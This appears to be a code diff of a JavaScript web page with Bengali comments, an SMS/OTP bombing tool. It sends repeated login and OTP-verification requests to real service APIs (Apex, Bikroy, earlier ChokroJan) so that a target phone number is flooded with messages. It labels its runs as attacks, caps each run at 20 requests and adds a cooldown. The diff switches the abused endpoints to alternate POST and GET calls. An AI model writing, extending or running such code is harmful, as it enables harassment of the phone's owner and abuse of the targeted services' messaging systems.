@@ -1,6 +1,6 @@
 let isCooldown = false; 
 
-// পেজ লোড হওয়ার সময় আগের টাইমার চেক করবে
+// পেজ লোড হওয়ার সময় আগের টাইমার চেক করা
 window.onload = function() {
     const savedCooldownTime = localStorage.getItem('cooldownEndTime');
     if (savedCooldownTime) {
@@ -14,40 +14,44 @@ window.onload = function() {
 
 async function startProcess() {
     const target = document.getElementById('target').value;
-    const countInput = document.getElementById('count');
-    const count = parseInt(countInput.value);
+    const count = parseInt(document.getElementById('count').value);
     const display = document.getElementById('display');
 
     if (isCooldown) {
-        display.innerText = "Wait for cooldown to end!";
+        display.innerText = "Wait for cooldown!";
         return;
     }
 
     if(!target || !count) { 
-        display.innerText = "Enter number and amount!";
+        display.innerText = "Enter target and amount!";
         return; 
     }
 
     if (count > 20) {
-        display.innerText = "Error: Maximum limit is 20!";
+        display.innerText = "Error: Limit is 20!";
         return;
     }
 
-    display.innerText = "ChokroJan Attack Started...";
+    display.innerText = "Apex & Bikroy Attack Started...";
     
     for (let i = 1; i <= count; i++) {
         try { 
-            // আপনার নিজের খুঁজে বের করা ChokroJan POST API
-            await fetch('https://chokrojan.com/api/v1/passenger/login/mobile', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    "mobile_number": target // ChokroJan এ শুধু নম্বর দিলেই হয়
-                }),
-                mode: 'cors'
-            });
+            if (i % 2 !== 0) {
+                // ১. Apex (POST Method)
+                await fetch('https://api.apex4u.com/api/auth/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ "phoneNumber": target }),
+                    mode: 'cors'
+                });
+            } else {
+                // ২. Bikroy (GET Method)
+                // গেট মেথডে বডি লাগে না, নম্বর সরাসরি লিঙ্কে থাকে
+                await fetch(`https://bikroy.com/data/phone_number_verification/otp?phone=${target}`, {
+                    method: 'GET',
+                    mode: 'cors'
+                });
+            }
 
             display.innerText = "Sent: " + i;
             
@@ -58,7 +62,7 @@ async function startProcess() {
         }
     }
 
-    // কাজ শেষে ৬০ সেকেন্ডের কুলডাউন সেট করা
+    // ৬০ সেকেন্ডের কুলডাউন
     const cooldownEndTime = Date.now() + 60000;
     localStorage.setItem('cooldownEndTime', cooldownEndTime);
     activateCooldown(60);
@@ -67,21 +71,19 @@ async function startProcess() {
 function activateCooldown(seconds) {
     isCooldown = true;
     let timeLeft = seconds;
-    
     const timer = setInterval(() => {
         timeLeft--;
         document.getElementById('display').innerText = `Wait: ${timeLeft}s`;
-        
         if (timeLeft <= 0) {
             clearInterval(timer);
             isCooldown = false;
             localStorage.removeItem('cooldownEndTime');
-            document.getElementById('display').innerText = "Ready for Next Attack!";
+            document.getElementById('display').innerText = "Ready!";
         }
     }, 1000);
 }
 
-// Matrix Background Animation
+// Matrix Animation
 const canvas = document.getElementById('matrix');
 const ctx = canvas.getContext('2d');
 canvas.width = window.innerWidth;
@@ -90,7 +92,6 @@ const letters = "0123456789ABCDEF";
 const fontSize = 16;
 const columns = canvas.width / fontSize;
 const drops = Array(Math.floor(columns)).fill(1);
-
 function draw() {
     ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
     ctx.fillRect(0, 0, canvas.width, canvas.height);
